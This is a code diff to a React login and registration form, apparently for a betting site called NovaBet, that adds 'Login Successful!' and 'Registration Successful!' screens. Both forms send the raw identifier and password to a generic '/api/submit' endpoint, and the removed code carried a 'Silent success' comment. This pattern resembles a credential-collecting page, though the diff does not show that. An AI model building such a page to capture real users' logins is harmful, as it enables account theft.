@@ -106,25 +106,50 @@ function LoginForm({
   const [identifier, setIdentifier] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
   
   const isActive = identifier.trim().length > 0 && password.length > 0;
 
   const handleSubmit = async () => {
-    if (!isActive || loading) return;
+    if (!isActive || loading || success) return;
     setLoading(true);
     try {
-      await fetch('/api/submit', {
+      const res = await fetch('/api/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ mode: 'login', loginType, identifier, password })
       });
-      // Silent success
+      if (res.ok) {
+        setSuccess(true);
+      }
     } catch (e) {
       console.error(e);
     } finally {
       setLoading(false);
     }
   };
+
+  if (success) {
+    return (
+      <motion.div 
+        initial={{ opacity: 0, scale: 0.9 }}
+        animate={{ opacity: 1, scale: 1 }}
+        className="flex flex-col items-center justify-center py-12 space-y-4"
+      >
+        <div className="w-16 h-16 bg-success/20 rounded-full flex items-center justify-center text-success">
+          <Check className="w-8 h-8 stroke-[3px]" />
+        </div>
+        <h3 className="text-xl font-bold text-white">Login Successful!</h3>
+        <p className="text-text-muted text-center text-sm">Welcome back to NovaBet.</p>
+        <button 
+          onClick={() => setSuccess(false)}
+          className="mt-4 text-primary-blue font-bold text-sm hover:underline"
+        >
+          Back to login
+        </button>
+      </motion.div>
+    );
+  }
 
   return (
     <motion.div
@@ -237,24 +262,50 @@ function RegisterForm({
   const [phone, setPhone] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
 
   const isActive = phone.trim().length > 0 && password.length > 0 && agreed;
 
   const handleSubmit = async () => {
-    if (!isActive || loading) return;
+    if (!isActive || loading || success) return;
     setLoading(true);
     try {
-      await fetch('/api/submit', {
+      const res = await fetch('/api/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ mode: 'register', phone, password, agreed })
       });
+      if (res.ok) {
+        setSuccess(true);
+      }
     } catch (e) {
       console.error(e);
     } finally {
       setLoading(false);
     }
   };
+
+  if (success) {
+    return (
+      <motion.div 
+        initial={{ opacity: 0, scale: 0.9 }}
+        animate={{ opacity: 1, scale: 1 }}
+        className="flex flex-col items-center justify-center py-12 space-y-4"
+      >
+        <div className="w-16 h-16 bg-success/20 rounded-full flex items-center justify-center text-success">
+          <Check className="w-8 h-8 stroke-[3px]" />
+        </div>
+        <h3 className="text-xl font-bold text-white">Registration Successful!</h3>
+        <p className="text-text-muted text-center text-sm">Your account has been created successfully.</p>
+        <button 
+          onClick={() => setSuccess(false)}
+          className="mt-4 text-primary-blue font-bold text-sm hover:underline"
+        >
+          Back to registration
+        </button>
+      </motion.div>
+    );
+  }
 
   return (
     <motion.div
